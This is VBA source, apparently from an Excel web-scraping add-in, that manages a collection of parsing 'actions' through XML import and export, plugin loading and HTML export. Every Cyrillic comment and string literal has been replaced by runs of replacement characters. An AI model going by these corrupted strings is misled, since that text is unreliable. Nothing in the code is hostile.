                        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        If Len(SIarr(ii)) > 0 Then Me.ParentParser.ExecuteForValue SIarr(ii)
                        
                        DoEvents
                        If DESCRIPTION_MODE_FOR_ITEM Then GoTo exitApplyTo
                        If StopMacro Then GoTo exitApplyTo
                    Next ii
                    Erase SIarr
                    
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 30.08.2019
                    Me.ParentParser.AASets.GetItemByName(ACTION_SET_NAME_AFTER_LAST_LEVEL$).Execute
                End If
            End If
        End If
        
Label_Exit_2:
    Next i
Label_Exit_3:
    
    '    If DESCRIPTION_MODE And (Not Me.ParentActions Is Nothing) Then
    '        PublishHTML_CloseTable
    '    End If
    
    If SHOW_PI2 Then Me.ParentParser.PrInd2.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd|", " ", " "
    values = Join(arr, ARSEP)
    RemoveExtraSeparators values
    Application.EnableCancelKey = 1
    
exitApplyTo:
    DoEvents
    Erase arr
    Set aa = Nothing
End Function


Function GetItemByCodename(ByVal AA_codename As String) As ArrayAction
    On Error Resume Next: Set GetItemByCodename = New ArrayAction
    Dim aa As ArrayAction
    For Each aa In Me.Items
        If aa.Codename = AA_codename Then
            Set GetItemByCodename = aa: Exit Function
        End If
    Next
End Function

Function ActionExists(ByVal AA_codename$) As Boolean
    On Error Resume Next: Dim aa As ArrayAction
    For Each aa In Me.Items
        If aa.Codename = AA_codename Then ActionExists = True: Exit Function
    Next
End Function

Function ArrayOfNames() As Variant        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Items.Count = 0 Then ArrayOfNames = Array(): Exit Function
    Dim aa As ArrayAction, i&, cat As FUNCTION_CATEGORIES, CategoriesColl As New Collection
    
    For Each aa In Me.Items
        CategoriesColl.Add 0, CStr(aa.Category)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Next
    
    ReDim arr(1 To Items.Count + CategoriesColl.Count * 2, 0 To 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Set CategoriesColl = New Collection
    
    For cat = 1 To 70
        For Each aa In Me.Items
            If aa.Category = cat Then
                Err.Clear: CategoriesColl.Add 0, CStr(cat)
                If Err = 0 Then i = i + 2: arr(i, 0) = "" & GetFunctionCategoryTXT(cat)
                i = i + 1
                With aa
                    arr(i, 0) = "        " & .Name
                    arr(i, 1) = .Codename
                    arr(i, 2) = .Description
                    ' Range("a" & Rows.Count).End(xlUp).Offset(1).Resize(, 3).Value = Array(GetFunctionCategoryTXT(cat), .Codename, .Name)
                End With
            End If
        Next
    Next cat
    ArrayOfNames = arr
End Function

Function ToArray(Optional ByVal AllActions As Boolean = False, _
        Optional ByVal ShowLevelsInfo As Boolean = False) As Variant
    On Error Resume Next
    If Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim aa As ArrayAction, n As Long, r As Long, i&, PAcount&, SAcount&, currLevel&
    
    If ShowLevelsInfo Then
        currLevel& = Me.GetLevel
        PAcount& = currLevel& - 1
        SAcount& = Me.GetMaxLevel - currLevel&
    End If
    
    ReDim arr(0 To Items.Count - 1 + PAcount& + SAcount&, 0 To 4)
    For i = 1 To PAcount&
        arr(n, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & i
        arr(n, 2) = "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Me.GetActionsByLevel(i).Items.Count & ")"
        n = n + 1
    Next i
    
    For i = 0 To Items.Count - 1
        Set aa = Items(i + 1)
        If aa.Enabled Or AllActions Then
            With aa
                arr(n, 0) = r + 1
                arr(n, 1) = IIf(aa.Enabled, "", "      |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  ") & .Name
                arr(n, 2) = .GetParametersInfo
                arr(n, 4) = .Codename
            End With
            n = n + 1: r = r + 1
        End If
    Next i
    
    For i = 1 To SAcount&
        arr(n, 1) = " .. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & currLevel& + i
        arr(n, 2) = "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Me.GetActionsByLevel(currLevel& + i).Items.Count & ")"
        n = n + 1
    Next i
    
    ToArray = arr
End Function

Function AddFromObject(ByRef NewAA As ArrayAction, Optional ByVal After&) As ArrayAction
    Set AddFromObject = New ArrayAction
    AddFromObject.LoadFromXML NewAA.ExportToXML
    Set AddFromObject.Parent = Me
    If After& Then Me.Items.Add AddFromObject, , , After& Else Me.Items.Add AddFromObject
    UpdateIndexes
End Function

Function AddNewAction(ByVal Codename$, Optional ByVal After&) As ArrayAction
    Set AddNewAction = New ArrayAction
    With AddNewAction
        .Name = DEFAULT_ACTION_NAME$: .Codename = Codename$
        .Description = "": .Enabled = True: Set .Parent = Me
        .LoadParameters Codename$
    End With
    If After& Then Me.Items.Add AddNewAction, , , After& Else Me.Items.Add AddNewAction
    UpdateIndexes
End Function

Function AddAction(ByVal Category As FUNCTION_CATEGORIES, ByVal Codename$, ByVal Name$, _
        Optional HasManual As Boolean) As ArrayAction
    Set AddAction = New ArrayAction
    If Codename = "" Then Exit Function
    With AddAction
        .Category = Category
        .Name = Name
        .Codename = Codename$
        .HasManual = HasManual
        UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
    End With
    Me.Items.Add AddAction
End Function

Function AddFromPlugin(ByVal Codename$, ByVal Name$, Optional ByVal Category& = 0) As ArrayAction
    Set AddFromPlugin = New ArrayAction
    If Codename$ = "" Then Exit Function
    
    If ActionExists("+" & Codename$) Then
        AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Plugin_Name & "|fffd|</b><br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <b>" & Codename$ & "</b><br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.", bt_Warning
        Exit Function
    End If
    
    With AddFromPlugin
        .Category = Plugin_Cat_Index
        .Name = Name
        
        If Category& > 0 Then
            .Category = Category&
            .Name = Plugin_Name & ": " & Name
        End If
        
        .Source = Plugin_Name
        .Codename = "+" & Codename$
        .HasManual = False
        UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
    End With
    Me.Items.Add AddFromPlugin
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = True, Optional Level&) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, aa As ArrayAction
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        node.Attributes.setNamedItem(.createAttribute("Level")).text = IIf(Level&, Level&, Me.GetLevel)
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 2
        For Each aa In Me.Items
            If aa.Enabled Or SaveDisabledActions Then node.appendChild aa.ExportToXML
        Next aa
        
        If Not Me.SubActions Is Nothing Then node.appendChild Me.SubActions.ExportToXML(, IIf(Level&, Level& + 1, 0))
    End With
    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If
        Dim AAnode As IXMLDOMElement, aa As ArrayAction, SubAAs As IXMLDOMElement
        Set Me.Items = New Collection
        For Each AAnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set aa = New ArrayAction: aa.LoadFromXML AAnode
            Set aa.Parent = Me: Items.Add aa
            Me.UpdateIndexes
        Next
        
        Set Me.SubActions = Nothing
        Set SubAAs = node.SelectSingleNode(XML_NODE_NAME$)
        If Not SubAAs Is Nothing Then
            Set Me.SubActions = New ArrayActions
            With Me.SubActions
                Set .ParentParser = Me.ParentParser: Set .ParentActions = Me        ' |fffd||fffd||fffd| 3-|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                .LoadFromXML SubAAs
                Set .ParentParser = Me.ParentParser: Set .ParentActions = Me
            End With
        End If
    End If
    
End Sub

Function GetFunctionCategoryTXT(ByVal cat As FUNCTION_CATEGORIES) As String
    On Error Resume Next
    Select Case cat
        Case fc_Numbers: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_Text: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_EncodeAndFormat: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_Check: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_Another: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_Variable: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_Array: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        Case fc_HTML: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| HTML"
        Case fc_WinHTTP: GetFunctionCategoryTXT = "HTTP |fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_Workbook: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel"
        Case fc_Files: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Case fc_IE: GetFunctionCategoryTXT = "Internet Explorer"
        Case fc_WebQuery_XML_Macro: GetFunctionCategoryTXT = "|fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| XML, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| VBA"
        Case fc_ParserOptions: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case fc_Developer: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!)"
        Case fc_UNUSED: GetFunctionCategoryTXT = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!)"
        Case Is >= fc_Plugins: GetFunctionCategoryTXT = PLUGIN_FUNCTION_CATEGORIES.item(cat)
    End Select
End Function

Function GetAllCategories() As Collection
    Dim i&: Set GetAllCategories = New Collection
    For i = 0 To 70
        If Len(GetFunctionCategoryTXT(i)) > 0 Then
            If ((i <> fc_UNUSED) Or SETT.GetBoolean("DeveloperMode")) Then GetAllCategories.Add i
        End If
    Next
End Function

' ================ |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ================

Sub InitializeActionsFromPlugins()
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim file As Variant, Internal_Plugin_Name As String
    Start_All_Plugins
    If PLUGIN_LIST.Count Then
        Plugin_Cat_Index = fc_Plugins
        Set PLUGIN_FUNCTION_CATEGORIES = New Dictionary
        
        For Each file In PLUGIN_LIST.Keys
            Plugin_Name = Split(file, ".xl")(0)
            'Debug.Print "check plugin", Plugin_Name
            Internal_Plugin_Name = "": Internal_Plugin_Name = Run("'" & file & "'!PluginName")
            If Len(Internal_Plugin_Name) Then Plugin_Name = Internal_Plugin_Name
            PLUGIN_FUNCTION_CATEGORIES.Add Plugin_Cat_Index, Plugin_Name
            
            Run "'" & file & "'!PluginActions", Me    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Plugin_Cat_Index = Plugin_Cat_Index + 1
        Next
    End If
End Sub

Sub InitializeAllArrayActions()
    On Error Resume Next
    InitializeActions_Check Me
    InitializeActions_Numbers Me
    InitializeActions_Text Me
    InitializeActions_Encode Me
    InitializeActions_Array Me
    InitializeActions_WinHTTP Me
    InitializeActions_HTML_NEW Me
    InitializeActions_HTML Me
    InitializeActions_Files Me
    InitializeActions_Another Me
    InitializeActions_Variables Me
    InitializeActions_IE Me
    InitializeActions_WebQuery Me
    InitializeActions_Workbook Me
    InitializeActions_UNUSED Me
    InitializeActions_Developer Me
    
    InitializeActionsFromPlugins
End Sub

Sub ReadClipboard(): Me.Load "Actions": End Sub
Sub SaveClipboard(): Me.SaveAs "Actions": End Sub
    
Sub SaveAs(ByVal RegistrySectionName$)
    On Error Resume Next
    SaveSetting PROJECT_NAME$, "Clipboard", RegistrySectionName$, Me.ExportToXML(True).XML
End Sub

Function Load(ByVal RegistrySectionName$) As String
    On Error Resume Next: Dim txt$, aa As ArrayAction
    txt$ = GetSetting(PROJECT_NAME$, "Clipboard", RegistrySectionName$, "")
    With CreateObject("Microsoft.XMLDOM")
        .preserveWhiteSpace = True
        If .LoadXML(txt$) Then Me.LoadFromXML .DocumentElement
    End With
    'For Each AA In Me.Items: AA.Enabled = True: Next
    Load = txt$
End Function

Sub ExportToHTML(ByVal SourceValue$, Optional ByVal AddResultColumn As Boolean, Optional ByVal AddSourceValue As Boolean, _
        Optional ByVal SmallFields As Boolean, Optional ByVal ActiveActionIndex&)
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    If Me.Items.Count = 0 Then Exit Sub
    
    Dim aa As ArrayAction, par As ArrayActionParameter, n&, txt$, action_name$, par_value$, par_class$, par_name$, pos&, AA_NAME$
    Dim txt_before$, ActionResult$, txt_previuous$, ActionRes$, AA_NAME_Before$, AA_NAME_After$, CommentRow$
    
    txt_before$ = SourceValue$
    
    If AddSourceValue And AddResultColumn Then
        If Len(txt_before$) Then txt$ = txt$ & "<table class=""ArrayActions ResultValues"">" & vbNewLine & "<thead><tr><th class=""result"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th></tr></thead>" & _
            vbNewLine & "<tbody>" & vbNewLine & vbTab & "<tr><td class=""action-result"">" & _
            ValueDescriptionHTML(txt_before$, True) & "</td></tr>" & vbNewLine & "</tbody>" & vbNewLine & "</table>"
    End If
    
    txt$ = txt$ & "<table class=""ArrayActions"">" & vbNewLine & "<thead><tr><th>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><th>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><th>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th>" & _
        IIf(AddResultColumn, "<th class=""result"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th>", "") & "</tr></thead>" & _
        vbNewLine & "<tbody>" & vbNewLine
    
    TEST_ACTIONS_MODE = True
    For Each aa In Me.Items
        n = 0: txt_previuous$ = SourceValue$
        aa.ApplyTo SourceValue$
        ' If AA.Codename Like "+*" Then Stop
        ActionRes$ = ""
        If AddResultColumn Then ActionRes$ = vbNewLine & vbTab & vbTab & _
            "<td rowspan=""" & IIf(aa.parameters.Count > 0, aa.parameters.Count, 1) & """ class=""action-result"">" & _
            ValueDescriptionHTML(SourceValue$, Not SmallFields, txt_previuous$ = SourceValue$) & "</td>" & vbNewLine
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        AA_NAME$ = "<a href='https://ExcelVBA.ru/programmes/Parser/actions/" & aa.Codename & "' class='action-manual-link' target='_blank'>" & aa.Name & "</a>"
        '        If AA.Index = ActiveActionIndex& Then    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
        '            AA_NAME_Before$ = AA_NAME$
        '            AA_NAME_After$ = "<span class='active-action-name'>" & AA.Name & "</span>"
        '        End If
        
        CommentRow$ = ""
        If Trim(aa.Comment) <> "" Then
            CommentRow$ = "<div class=""action-comment"">" & Replace(Trim(aa.Comment), vbNewLine, "<br />") & "</div>"
            CommentRow$ = vbTab & "<tr class=""action-comment top-row""><td colspan=""4"">" & CommentRow$ & "</td></tr>" & vbNewLine
        End If
        
        If aa.parameters.Count Then
            For Each par In aa.parameters
                n = n + 1: action_name$ = "": ActionResult$ = ""
                If n = 1 Then
                    action_name$ = vbTab & vbTab & "<td rowspan=""" & aa.parameters.Count & """ class=""action-name" & _
                        IIf(aa.Enabled, "", " action-disabled") & """>" & IIf(aa.Enabled, "", "<span style=""color:red;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</span><br />") & _
                        AA_NAME$ & "</td>" & vbNewLine
                    
                    ActionResult$ = ActionRes$
                End If
                
                par_value$ = Replace(Replace(par.value, ">", "&gt;"), "<", "&lt;")
                par_class$ = IIf(par_value$ = "", " parameter-blank", "")
                par_name$ = par.Description: pos& = InStrRev(par.Description, "(") - 1
                If pos& > 0 Then par_name$ = Trim(Left(par.Description, pos&))
                par_name$ = Replace(par_name$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "InnerHTML |fffd||fffd||fffd| OuterHTML")
                
                If n = 1 Then txt = txt & CommentRow$
                
                txt = txt & vbTab & "<tr" & IIf((n = 1) And (CommentRow$ = ""), " class='top-row'", "") & ">" & vbNewLine & action_name$ & vbTab & _
                    vbTab & "<td class=""parameter-name" & par_class$ & """>" & _
                    par_name$ & "</td>" & vbNewLine & vbTab & vbTab & "<td class=""parameter-value" & par_class$ & """>" & _
                    par_value$ & "</td>" & ActionResult$ & vbNewLine & vbTab & "</tr>" & vbNewLine
            Next par
        Else
            action_name$ = vbTab & vbTab & "<td rowspan=""" & 1 & """ class=""action-name" & _
                IIf(aa.Enabled, "", " action-disabled") & """>" & IIf(aa.Enabled, "", "<span style=""color:red;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</span><br />") & _
                AA_NAME$ & "</td>" & vbNewLine
            
            txt = txt & CommentRow$
            txt = txt & vbTab & "<tr class='top-row'>" & vbNewLine & action_name$ & vbTab & vbTab & "<td class=""parameter-name parameter-blank""></td>" & vbNewLine & _
                vbTab & vbTab & "<td class=""parameter-value parameter-blank""></td>" & ActionRes$ & vbNewLine & vbTab & "</tr>" & vbNewLine
        End If
        'txt = txt & vbTab & "<tr class=""separator-row""><td colspan=""" & IIf(AddResultColumn, 4, 3) & """></td></tr>" & vbNewLine
    Next
    TEST_ACTIONS_MODE = False
    txt = txt & "</tbody>" & vbNewLine & "</table>"
    
    If AddSourceValue And Not AddResultColumn Then
        If SmallFields Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            If (InStr(1, txt_before$, ARSEP) = 0) And (InStr(1, SourceValue$, ARSEP) = 0) And (Len(txt_before$) < 30) And (Len(SourceValue$) < 30) Then
                
                txt$ = txt$ & "<table class=""ArrayActions ResultValues SmallValues"">" & vbNewLine & "<tbody><tr>" & _
                    "<th class='result result-small'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><td class='action-result action-result-small'>" & Value_ShortHTML(txt_before$) & "</td>" & _
                    "<th class='clear' style='width: 30%;'>" & _
                    "</th><th class='result result-small'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><td class='action-result action-result-small'>" & Value_ShortHTML(SourceValue$) & "</td>" & _
                    "</tr></tbody>" & vbNewLine & "</table><p>&nbsp;</p>" & vbNewLine
                
            Else
                txt$ = txt$ & "<table class=""ArrayActions ResultValues"">" & vbNewLine & _
                    "<thead><tr><th class=""result"" style=""width: 49%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & IIf(InStr(1, txt_before$, ARSEP), " (|fffd||fffd||fffd||fffd||fffd||fffd|)", "") & "</th>" & _
                    "<th class=""clear"" style=""width: 2%;""></th><th class=""result"" style=""width: 49%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & IIf(InStr(1, SourceValue$, ARSEP), " (|fffd||fffd||fffd||fffd||fffd||fffd|)", "") & "</th></tr></thead>" & _
                    vbNewLine & "<tbody>" & vbNewLine & vbTab & "<tr><td class=""action-result"">" & _
                    ValueDescription_SimpleHTML(txt_before$) & "</td><td class=""clear""></td><td class=""action-result"">" & _
                    ValueDescription_SimpleHTML(SourceValue$) & "</td></tr>" & vbNewLine & "</tbody>" & vbNewLine & "</table><p>&nbsp;</p>" & vbNewLine
            End If
        Else
            txt$ = txt$ & "<table class=""ArrayActions ResultValues"">" & vbNewLine & _
                "<thead><tr><th class=""result"" style=""width: 50%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><th class=""result"" style=""width: 50%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th></tr></thead>" & _
                vbNewLine & "<tbody>" & vbNewLine & vbTab & "<tr><td class=""action-result"">" & _
                ValueDescriptionHTML(txt_before$, True) & "</td><td class=""action-result"">" & _
                ValueDescriptionHTML(SourceValue$, True, txt_before$ = SourceValue$) & "</td></tr>" & vbNewLine & "</tbody>" & vbNewLine & "</table><p>&nbsp;</p>" & vbNewLine
        End If
    End If
    
    Dim TXT_ForClipboard$: TXT_ForClipboard$ = txt$
    TXT_ForClipboard$ = Replace(TXT_ForClipboard$, AA_NAME_Before$, AA_NAME_After$)
    TXT_ForClipboard$ = Replace(TXT_ForClipboard$, "https://ExcelVBA.ru/", "/")
    TXT_ForClipboard$ = Replace(TXT_ForClipboard$, " target='_blank'", "")
    ' TXT_ForClipboard$ = TXT_ForClipboard$ & "<p>&nbsp;</p>" & vbNewLine
    
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText TXT_ForClipboard$
        .PutInClipboard
    End With
    Shell "Cmd.exe /c echo " & Chr(7), vbHide
    
    
    txt$ = Replace(txt$, "<code", "<textarea")
    txt$ = Replace(txt$, "</code", "</textarea")
    ShowParserDescriptionAtLocalhost txt$, True
End Sub

Sub GetAllVariablesNames(ByRef coll As Collection)
    On Error Resume Next: Dim aa As ArrayAction, par_value$, VariableName
    For Each aa In Me.Items
        Select Case aa.Codename
            
            Case "SetVariable"
                par_value$ = aa.parameters("Name").value
                coll.Add par_value$, par_value$
                
            Case "AddItemIntoValuesList"
                par_value$ = aa.parameters("AddToVariable").value
                coll.Add par_value$, par_value$
                
            Case "GetHyperlinkAndText"
                par_value$ = aa.parameters("URL_VarName").value
                coll.Add par_value$, par_value$
                par_value$ = aa.parameters("Text_VarName").value
                coll.Add par_value$, par_value$
                
            Case "SetValue", "GetRandomNumber", "ArrayItemsCount", "CharactersCount"
                par_value$ = aa.parameters("VarName").value
                coll.Add par_value$, par_value$
                
            Case "GetWorksheetNames"
                par_value$ = aa.parameters("ActiveSheetVarname").value
                coll.Add par_value$, par_value$
                
            Case "Split2"
                par_value$ = aa.parameters("VarNames").value
                For Each VariableName In Split(par_value$, "|")
                    If Len(Trim(VariableName)) Then coll.Add CStr(Trim(VariableName)), CStr(Trim(VariableName))
                Next
                
            Case "SolveGoogleCaptcha"
                par_value$ = "g-recaptcha-response"
                coll.Add par_value$, par_value$
                
            Case "WinHTTP_LoadPageWithCookies", "POST_Auth", "WinHTTP_Send_getResponse", "WinHTTP_Send"
                coll.Add "FirstHttpStatusCode", "FirstHttpStatusCode"
                coll.Add "LastHttpStatusCode", "LastHttpStatusCode"
                coll.Add "LastRedirectURL", "LastRedirectURL"
                
        End Select
    Next
    If Not Me.SubActions Is Nothing Then Me.SubActions.GetAllVariablesNames coll        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
End Sub

Attribute VB_Name = "FP_ArrayActions_Edit"
Attribute VB_Base = "0{70372777-329C-4313-9825-9A0276ED208F}{3784F3EF-12A3-4CFB-BFF7-0B7ED3066643}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : FP_ArrayActions_Edit
' Author        : Igor Vakhnenko            Date: 14.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Public ActiveAction As ArrayAction, AAs As ArrayActions, CallerUF As MSForms.UserForm
